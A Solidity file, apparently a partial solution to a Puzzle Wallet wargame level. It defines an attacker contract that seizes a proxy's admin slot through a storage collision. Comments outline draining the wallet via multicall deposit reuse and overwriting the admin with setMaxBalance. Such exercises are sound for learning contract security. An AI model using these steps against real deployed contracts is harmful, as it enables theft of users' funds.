/** ************* FINDINGS  ********************* */
/*
  @audit-info => delegating calls from this Attacker contract to the PuzzleProxy running the PuzzleWallet logic it won't be an option because:
    - delegatecalls will use the context of the Attacker contract, thus, the changes made on such a delegatecall will be applied to this Attacker contract, not to the Proxy contract!
      * delegatecall to the puzzleProxyRunningLogicContractCode forwards the msg.sender of the execution context of the Attacker contract, but also forwards the storage and balances of the Attacker contract!

    // @audit-info => Executing functions of the Proxy contract using the Logic code can't be called directly using the Interface defined above (IPuzzleWallet)
      // The reason is when calling a function through an interface, what is happening under the hood is that a call() is created, thus, the msg.sender will be address of this Attacker contract, instead of the address of the actual Player!

    // @audit => The only alternative when is required to execute the Logic code on the Proxy contract will be to create an instance (on hardhat) of the deployed Proxy contract using the Logic code and interact directly with such an instance!

*/


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPuzzleProxy {
  // Step 1 - Gain ownership of the PuzzleWallet contract
  function proposeNewAdmin(address) external;

  function pendingAdmin() external view returns (address);
}

interface IPuzzleWallet {
  // Step 1.1 - Add Player to the Whitelist
  function addToWhitelist(address) external;

  // Step 2.1 - Prepare the calldata that will be sent to the multicall() function <===> multicall() expects to receive a single array of bytes (bytes[])
  function deposit() external payable;
  function multicall(bytes[] calldata) external payable;
  
  // Step 2.1.2 - Withdraw the Player's balance after it was altered on the multicall() recursive execution!
  function execute(address, uint256, bytes calldata) external payable;

  // Step 2.1.3 - One the PuzzleProxy contract's balance is 0, call the setMaxBalance() and send the Player's address masked as an uint256 to set the Player's address as the PuzzleProxy admin
  function setMaxBalance(uint256) external;

  function whitelisted(address) external returns(bool);

  function owner() external view returns (address);
}


contract AttackPuzzleWallet {
  // Instance to connect to the Proxy contract
  IPuzzleProxy puzzleProxyContract;

  // Instance to connect to the Proxy contract executing code of the Implementation/Logic contract (PuzzleWallet)
  IPuzzleWallet puzzleProxyRunningLogicContractCode;

  address public player;

  event Log(string message);

  constructor(address _puzzleProxyAddress) {
    // Instance to connect to the Proxy contract executing the Proxy contract's code itself!
    puzzleProxyContract = IPuzzleProxy(_puzzleProxyAddress);

    // Instance to connect to the Proxy contract executing code of the Implementation/Logic contract (PuzzleWallet)
    puzzleProxyRunningLogicContractCode = IPuzzleWallet(_puzzleProxyAddress);

    player = msg.sender;
  }

  modifier onlyPlayer() {
    require(msg.sender == player, "Only the player can call this function");
    _;
  }

  function gainPuzzleWalletOwnership() public onlyPlayer() {
    puzzleProxyContract.proposeNewAdmin(player);
    require(player == puzzleProxyContract.pendingAdmin(), "Error while gaining ownership of the PuzzleWallet contract");
    emit Log("Player has taken ownership of the PuzzleWallet contract");    
  }

  /*
  function addPlayerToWhitelist() public onlyPlayer() {
    require(player == puzzleProxyRunningLogicContractCode.owner(), "Error, the player is not the PuzzleWallet owner");

    // @audit-info => delegating the call from this Attacker contract to the PuzzleProxy running the PuzzleWallet logic it won't be an option because:
      // - delegatecall will use the context of the Attacker contract, thus, the changes made on such a delegatecall will be applied to this Attacker contract, not to the Proxy contract!
    // delegatecall to addToWhitelist() to forward the msg.sender of the execution context when this function is been executed!
    (bool res, ) = address(puzzleProxyRunningLogicContractCode).delegatecall(abi.encodeWithSignature("addToWhitelist(address)", player));
    require(res, "Error while adding the Player to the Whitelist");


    // @audit-info => Executing functions of the Proxy contract using the Logic code can't be called directly using the Interface defined above (IPuzzleWallet)
      // The reason is when calling a function through an interface, what is happening under the hood is that a call() is created, thus, the msg.sender will be address of this Attacker contract, instead of the address of the actual Player!

    // @audit => The only alternative when is required to execute the Logic code on the Proxy contract will be to create an instance (on hardhat) of the deployed Proxy contract using the Logic code and interact directly with such an instance!

    // require(puzzleProxyRunningLogicContractCode.whitelisted(player), "Player was not added to the Whitelist");
    // emit Log("Player was added to the Whitelist");
  }
  */

}